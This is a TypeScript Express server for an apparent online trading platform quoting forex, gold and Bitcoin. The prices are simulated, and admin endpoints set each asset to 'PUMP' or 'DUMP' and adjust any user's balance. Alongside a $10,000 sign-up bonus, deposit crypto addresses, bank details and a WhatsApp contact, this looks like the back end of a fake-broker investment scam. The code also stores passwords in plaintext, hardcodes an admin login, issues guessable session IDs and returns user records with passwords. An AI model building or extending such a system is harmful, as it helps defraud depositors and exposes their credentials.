import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import fs from "fs";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = process.env.PORT || 3000;

  app.use(express.json());

  // Logging middleware
  app.use((req, res, next) => {
    console.log(`${req.method} ${req.url}`);
    next();
  });

  // --- API Routes (Security Layer) ---

  // --- Database Persistence Layer ---
  const DB_PATH = process.env.DATABASE_PATH || path.join(__dirname, 'database.json');

  const loadData = () => {
    try {
      if (fs.existsSync(DB_PATH)) {
        const data = fs.readFileSync(DB_PATH, 'utf8');
        return JSON.parse(data);
      }
    } catch (err) {
      console.error("[DB] Failed to load database:", err);
    }
    return null;
  };

  const saveData = (users: any[], newPaymentSettings?: any) => {
    try {
      const currentData = loadData() || {};
      const newData = { 
        users, 
        paymentSettings: newPaymentSettings || paymentSettings || currentData.paymentSettings || defaultPaymentSettings 
      };
      fs.writeFileSync(DB_PATH, JSON.stringify(newData, null, 2));
    } catch (err) {
      console.error("[DB] Failed to save database:", err);
    }
  };

  // Mock server-side state (in a real app, this would be a database)
  const defaultUsers = [
    { id: 'ADMIN_CHIEF', name: 'System Administrator', email: 'admin1234@gmail.com', password: 'admin1234', balance: 10450.75, status: 'Active', verified: true, joined: '2024-01-12', isAdmin: true, cards: [{ id: 'c1', brand: 'Visa', last4: '8421', expiry: '12/26' }] },
  ];

  const savedData = loadData();
  let serverUsers = savedData ? savedData.users : defaultUsers;

  let serverAssets = [
    { id: 'eurusd', name: 'EUR/USD', symbol: 'EUR/USD', price: 1.0824, change24h: 0.15, sparkline: [], trend: 'RANDOM', trendRate: 2 },
    { id: 'gbpusd', name: 'GBP/USD', symbol: 'GBP/USD', price: 1.2654, change24h: -0.22, sparkline: [], trend: 'RANDOM', trendRate: 2 },
    { id: 'usdjpy', name: 'USD/JPY', symbol: 'USD/JPY', price: 151.42, change24h: 0.45, sparkline: [], trend: 'RANDOM', trendRate: 2 },
    { id: 'xauusd', name: 'Gold', symbol: 'GOLD', price: 2355.20, change24h: 1.12, sparkline: [], trend: 'RANDOM', trendRate: 2 },
    { id: 'btcusd', name: 'Bitcoin', symbol: 'BTC/USD', price: 64250.00, change24h: -2.45, sparkline: [], trend: 'RANDOM', trendRate: 2 },
  ];

  const defaultPaymentSettings = {
    cryptoAddresses: [
      { id: '1', label: 'BTC Settlement Ledger', value: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', type: 'BTC' },
      { id: '2', label: 'ETH Settlement Ledger', value: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F', type: 'ETH' }
    ],
    eWallets: [
      { id: 'e1', label: 'PayPal Operational', value: 'payments@apex.financial', type: 'PAYPAL' },
      { id: 'e2', label: 'Skrill Global', value: 'skrill-id-99281', type: 'SKRILL' }
    ],
    bankDetails: {
      bankName: 'Apex Capital Reserve',
      accountNumber: 'APX-7700-4421-001',
      swiftCode: 'APXGB2L',
      holderName: 'Apex Financial Group'
    },
    bonusAmount: 10000,
    depositEnabled: true,
    whatsappUrl: 'https://wa.me/19453879820'
  };

  let paymentSettings = savedData && savedData.paymentSettings ? savedData.paymentSettings : defaultPaymentSettings;

  // Initialize sparklines with proper OHLC data for candlesticks
  serverAssets = serverAssets.map(a => {
    let currentPrice = a.price;
    const history = Array.from({ length: 100 }, (_, i) => {
      const open = currentPrice;
      const volatility = (a.symbol.includes('GOLD') || a.symbol.includes('BTC')) ? 0.005 : 0.001;
      const close = open * (1 + (Math.random() - 0.5) * volatility);
      const high = Math.max(open, close) * (1 + Math.random() * (volatility * 0.5));
      const low = Math.min(open, close) * (1 - Math.random() * (volatility * 0.5));
      currentPrice = close;
      return {
        time: `${i}:00`,
        open,
        high,
        low,
        close,
        value: close
      };
    });
    return { ...a, price: currentPrice, sparkline: history };
  });

  // Simple Session Store
  const sessions = new Map<string, any>();

  // Middleware to verify session (Security Guarantee)
  const authMiddleware = (req: any, res: any, next: any) => {
    const sessionId = req.headers['x-session-id'];
    if (!sessionId || !sessions.has(sessionId)) {
        return res.status(401).json({ error: "Unauthorized Access" });
    }
    const userId = sessions.get(sessionId);
    req.user = serverUsers.find(u => u.id === userId);
    next();
  };

  // Admin Security Layer
  const adminMiddleware = (req: any, res: any, next: any) => {
    if (!req.user || !req.user.isAdmin || req.user.email !== 'admin1234@gmail.com') {
        return res.status(403).json({ error: "Access Denied: High Privilege Required" });
    }
    next();
  };

  app.get("/api/payment-settings", (req, res) => {
    res.json(paymentSettings);
  });

  app.post("/api/admin/update-payment-settings", authMiddleware, adminMiddleware, (req, res) => {
    paymentSettings = req.body;
    saveData(serverUsers, paymentSettings);
    res.json(paymentSettings);
  });

  app.post("/api/auth/register", (req, res) => {
    const { name, email, password, phone, country } = req.body;
    if (!name || !email || !password) return res.status(400).json({ error: "Missing identity data" });
    
    const cleanEmail = email.trim().toLowerCase();

    // Check if user already exists
    if (serverUsers.find(u => u.email.toLowerCase() === cleanEmail)) {
        console.log(`[AUTH] Registration failed: Terminal ID ${cleanEmail} already commissioned`);
        return res.status(400).json({ error: "This Terminal ID is already commissioned. Please use the 'Sign In' tab if you already have an account." });
    }

    const newUser = {
      id: 'u' + Date.now(),
      name,
      email: cleanEmail,
      password,
      phone: phone || 'N/A',
      country: country || 'N/A',
      balance: 0, // Starts at 0, claimed via bonus
      status: 'Active',
      verified: true,
      joined: new Date().toISOString().split('T')[0],
      isAdmin: false,
      cards: [],
      portfolio: [],
      trades: []
    };

    serverUsers.push(newUser);
    saveData(serverUsers);
    
    const sessionId = Math.random().toString(36).substring(7);
    sessions.set(sessionId, newUser.id);
    
    console.log(`[AUTH] New user registered: ${email}`);
    res.json({ user: newUser, sessionId });
  });

  app.post("/api/user/claim-bonus", authMiddleware, (req: any, res) => {
    const user = serverUsers.find(u => u.id === req.user.id);
    if (!user) return res.status(404).json({ error: "User not found" });
    
    if ((user as any).bonusClaimed) {
        return res.status(400).json({ error: "Bonus already extracted" });
    }

    user.balance += (paymentSettings as any).bonusAmount || 10000;
    (user as any).bonusClaimed = true;
    saveData(serverUsers);
    
    res.json({ success: true, balance: user.balance });
  });

  app.post("/api/auth/login", (req, res) => {
    const { email, password } = req.body;
    const cleanEmail = (email || '').trim().toLowerCase();
    const user = serverUsers.find(u => u.email.toLowerCase() === cleanEmail && u.password === password);
    if (!user) return res.status(401).json({ error: "Invalid credentials" });
    
    const sessionId = Math.random().toString(36).substring(7);
    sessions.set(sessionId, user.id);
    console.log(`[AUTH] User logged in: ${cleanEmail}`);
    res.json({ user, sessionId });
  });

  // Middleware to verify session (Security Guarantee)
  // (Moved up for temporal dead zone safety)

  app.get("/api/assets", (req, res) => {
    res.json(serverAssets);
  });

  app.get("/api/user/me", authMiddleware, (req: any, res) => {
    res.json(req.user);
  });

  // Admin Security Layer
  // (Moved up for temporal dead zone safety)

  app.get("/api/admin/users", authMiddleware, adminMiddleware, (req, res) => {
    res.json(serverUsers);
  });

  app.post("/api/admin/adjust-balance", authMiddleware, adminMiddleware, (req, res) => {
    const { userId, amount } = req.body;
    const userIdx = serverUsers.findIndex(u => u.id === userId);
    if (userIdx === -1) return res.status(404).json({ error: "User not found" });
    
    serverUsers[userIdx].balance = Math.max(0, serverUsers[userIdx].balance + amount);
    saveData(serverUsers);
    res.json(serverUsers[userIdx]);
  });

  app.post("/api/admin/set-trend", authMiddleware, adminMiddleware, (req, res) => {
    const { assetId, trend, trendRate } = req.body;
    const assetIdx = serverAssets.findIndex(a => a.id === assetId);
    if (assetIdx === -1) return res.status(404).json({ error: "Asset not found" });
    
    serverAssets[assetIdx].trend = trend;
    if (trendRate !== undefined) serverAssets[assetIdx].trendRate = trendRate;
    res.json(serverAssets[assetIdx]);
  });

  // Message persistence for CS
  let serverMessages: any[] = [];

  app.get("/api/messages", authMiddleware, (req: any, res) => {
    res.json(serverMessages);
  });

  app.post("/api/messages/send", authMiddleware, (req: any, res) => {
    const { text, sender } = req.body;
    const newMsg = {
      id: Date.now(),
      sender: sender || 'user',
      text,
      time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
      userName: req.user.name,
      userId: req.user.id
    };
    serverMessages.push(newMsg);
    res.json(newMsg);
  });

  app.post("/api/admin/update-user-status", authMiddleware, adminMiddleware, (req, res) => {
    const { userId, status, verified } = req.body;
    const userIdx = serverUsers.findIndex(u => u.id === userId);
    if (userIdx === -1) return res.status(404).json({ error: "User not found" });
    
    if (status) serverUsers[userIdx].status = status;
    if (verified !== undefined) serverUsers[userIdx].verified = verified;
    saveData(serverUsers);
    res.json(serverUsers[userIdx]);
  });

  app.post("/api/user/update-profile", authMiddleware, (req: any, res) => {
    const { name, phone, country } = req.body;
    const userIdx = serverUsers.findIndex(u => u.id === req.user.id);
    if (userIdx === -1) return res.status(404).json({ error: "User not found" });
    
    if (name) serverUsers[userIdx].name = name;
    if (phone !== undefined) serverUsers[userIdx].phone = phone;
    if (country !== undefined) serverUsers[userIdx].country = country;
    saveData(serverUsers);
    res.json(serverUsers[userIdx]);
  });

  // Simulation loop on server
  setInterval(() => {
    serverAssets = serverAssets.map(asset => {
        const isVolatile = asset.symbol.includes('GOLD') || asset.symbol.includes('BTC');
        const defaultVolatility = isVolatile ? 0.002 : 0.0004;
        
        const open = asset.price;
        const rate = asset.trendRate || 2; // percent per minute, default 2%
        // Convert rate from % per minute to per-interval (2s = 1/30 of a minute)
        const intervalFraction = 2000 / 60000; // 2s / 60s = 0.0333
        const ratePerInterval = (rate / 100) * intervalFraction;

        let bias = 0;
        if (asset.trend === 'PUMP') bias = ratePerInterval;
        if (asset.trend === 'DUMP') bias = -ratePerInterval;
        if (asset.trend === 'STABLE') bias = (Math.random() - 0.5) * (defaultVolatility * 0.1); 

        const changePercent = ((Math.random() - 0.5) * defaultVolatility * 0.3) + bias;
        const close = open * (1 + changePercent);
        
        // Generate realistic High/Low
        const range = Math.abs(close - open);
        const wickMultiplier = isVolatile ? 3 : 1.5;
        const high = Math.max(open, close) + (Math.random() * range * wickMultiplier);
        const low = Math.min(open, close) - (Math.random() * range * wickMultiplier);

        const newSparkline = [...asset.sparkline.slice(1), { 
          time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }), 
          open,
          high,
          low,
          close,
          value: close
        }];

        return {
          ...asset,
          price: close,
          change24h: asset.change24h + (changePercent * 100),
          sparkline: newSparkline
        };
    });
  }, 2000);

  // --- Vite / Frontend Serving ---
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Financial Server running on http://localhost:${PORT}`);
  });
}

startServer();
